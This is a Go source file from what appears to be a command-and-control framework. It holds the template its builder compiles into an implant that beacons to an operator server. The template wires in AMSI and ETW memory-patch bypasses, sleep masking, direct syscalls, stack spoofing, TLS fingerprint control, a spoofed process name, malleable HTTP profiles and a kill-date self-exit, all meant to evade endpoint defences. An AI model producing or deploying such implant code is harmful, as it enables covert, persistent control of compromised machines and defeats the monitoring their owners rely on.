package builder

// agentMainTemplate 是 Agent 的源码模板。
// Builder 将配置注入模板后执行 go build。
// 借鉴 Sliver 的 renderSliverGoCode：生成的 main.go 仅负责初始化和启动，
// 所有核心逻辑（executor/modules/transport/session/sleep）复用生产代码。
//
// 注意：Go 原始字符串字面量（反引号）不能包含反引号，
// struct tag 使用 __BACKTICK__ 占位符，构建时替换为真实反引号。
const agentMainTemplate = `package main

import (
	"log"
	"os"
	"strings"
	"time"

	"encoding/hex"

	"github.com/aegis-c2/aegis/agent/config"
	"github.com/aegis-c2/aegis/agent/crypto"
	"github.com/aegis-c2/aegis/agent/evasion"
	"github.com/aegis-c2/aegis/agent/executor"
	"github.com/aegis-c2/aegis/agent/session"
)

// === 编译时注入的配置常量 ===
const (
	serverURL          = {{printf "%q" .Config.ServerURL}}
	serverPubKeyPEM    = {{printf "%q" .ServerPubKey}}
	serverECDHPubKey   = {{printf "%q" .ServerECDHPubKey}}
	encryptedAESKey    = {{printf "%q" .AESKeyEncrypted}}
	heartbeatInterval  = {{.Config.HeartbeatInterval}}
	heartbeatJitter    = {{.Config.HeartbeatJitter}}
	userAgent          = {{printf "%q" .Config.UserAgent}}
	processName        = {{printf "%q" .Config.ProcessName}}
	sleepMaskEnabled   = {{.Config.SleepMaskEnabled}}
	syscallEnabled     = {{.Config.SyscallEnabled}}
	killDate           = {{printf "%q" .Config.KillDate}}
	transportType      = {{printf "%q" .TransportType}}
	sleepTechnique     = {{printf "%q" .SleepTechnique}}
	amsiEnabled        = {{.AMSIEnabled}}
	etwEnabled         = {{.ETWEnabled}}
	tlsFingerprint     = {{printf "%q" .TLSFingerprint}}
	stackSpoof         = {{.StackSpoof}}
	rotationStrategy   = {{printf "%q" .RotationStrategy}}

	// Profile 配置
	profileMethod     = {{printf "%q" .Config.ProfileMethod}}
	profilePath       = {{printf "%q" .Config.ProfilePath}}
	profileHeaders    = {{printf "%q" .ProfileHeadersStr}}
	profileCookie     = {{printf "%q" .Config.ProfileCookie}}
	profileParam      = {{printf "%q" .Config.ProfileParam}}
	profileTransform  = {{printf "%q" .Config.ProfileTransform}}
)

func main() {
	// Kill date check
	if killDate != "" {
		if kd, err := time.Parse("2006-01-02", killDate); err == nil && time.Now().After(kd) {
			selfDestruct()
		}
	}

	// === AMSI/ETW 初始化（Windows） ===
	initAMSIETW()

	// === 构建 AgentConfig ===
	cfg := buildAgentConfig()

	// === 初始化 Executor（注册所有命令处理器） ===
	exec := executor.New(false, nil)

	// === 初始化 KeyEncryptor（RSA 密钥交换，向后兼容） ===
	keyEnc := initKeyEncryptor()

	// === 初始化 ECDH（X25519 密钥交换，首选） ===
	ecdhExch := initECDH()

	// === 创建 Session ===
	sessCfg := session.Config{
		ServerURL:         serverURL,
		ServerPubKey:      []byte(serverPubKeyPEM),
		ServerECDHPubKey:  hexDecode(serverECDHPubKey),
		HeartbeatInterval: heartbeatInterval,
		HeartbeatJitter:   heartbeatJitter,
		UserAgent:         userAgent,
		ProcessName:       processName,
		AgentConfig:       cfg,
	}

	var sess *session.Session
	if ecdhExch != nil {
		sess = session.NewWithECDH(sessCfg, exec, ecdhExch)
	} else {
		sess = session.New(sessCfg, exec, nil, keyEnc)
	}

	log.Printf("[agent] starting session")

	// === 运行主循环 ===
	if err := sess.Run(); err != nil {
		log.Printf("[agent] session error: %v", err)
	}
}

// buildAgentConfig 从编译时常量构建完整的 AgentConfig。
func buildAgentConfig() *config.AgentConfig {
	c := config.DefaultAgentConfig()
	c.ServerURL = serverURL
	c.HeartbeatInterval = heartbeatInterval
	c.HeartbeatJitter = heartbeatJitter
	c.UserAgent = userAgent
	c.ProcessName = processName
	c.ServerPubKeyPEM = serverPubKeyPEM
	c.TransportType = transportType
	c.SleepMaskEnabled = sleepMaskEnabled
	c.SyscallEnabled = syscallEnabled
	c.SleepTechnique = sleepTechnique
	c.AMSIEnabled = amsiEnabled
	c.ETWEnabled = etwEnabled
	c.TLSFingerprint = tlsFingerprint
	c.StackSpoof = stackSpoof
	c.RotationStrategy = rotationStrategy

	// 多服务器 URL 列表
	c.ServerURLs = []string{serverURL}

	// Profile 配置
	c.Method = profileMethod
	c.Path = profilePath
	c.CookieName = profileCookie
	c.ParamName = profileParam
	c.DataTransform = profileTransform

	// 解析 Profile Headers（格式: "Key1:Value1|Key2:Value2"）
	if profileHeaders != "" {
		c.Headers = make(map[string]string)
		pairs := strings.Split(profileHeaders, "|")
		for _, pair := range pairs {
			if kv := strings.SplitN(pair, ":", 2); len(kv) == 2 {
				c.Headers[kv[0]] = kv[1]
			}
		}
	}

	return c
}

// initKeyEncryptor 初始化 RSA 密钥交换器。
func initKeyEncryptor() session.KeyEncryptor {
	if serverPubKeyPEM == "" {
		return nil
	}
	ke, err := crypto.NewAgentCrypto()
	if err != nil {
		log.Printf("[agent] key encryptor init failed: %v", err)
		return nil
	}
	return ke
}

// initECDH 初始化 X25519 ECDH 密钥交换器。
func initECDH() session.ECDHKeyExchanger {
	if serverECDHPubKey == "" {
		return nil
	}
	ex, err := crypto.NewAgentECDH()
	if err != nil {
		log.Printf("[agent] ECDH init failed: %v", err)
		return nil
	}
	return ex
}

func hexDecode(s string) []byte {
	if s == "" {
		return nil
	}
	data, err := hex.DecodeString(s)
	if err != nil {
		return nil
	}
	return data
}

// initAMSIETW 处理 AMSI/ETW 绕过（仅 Windows）。
func initAMSIETW() {
	if !amsiEnabled {
		bypassAMSI()
	}
	if !etwEnabled {
		patchETW()
	}
}

func bypassAMSI()   { evasion.AMSIBypassMemoryPatch() }
func patchETW()     { evasion.ETWBypassMemoryPatch() }
func selfDestruct() { os.Exit(0) }
`
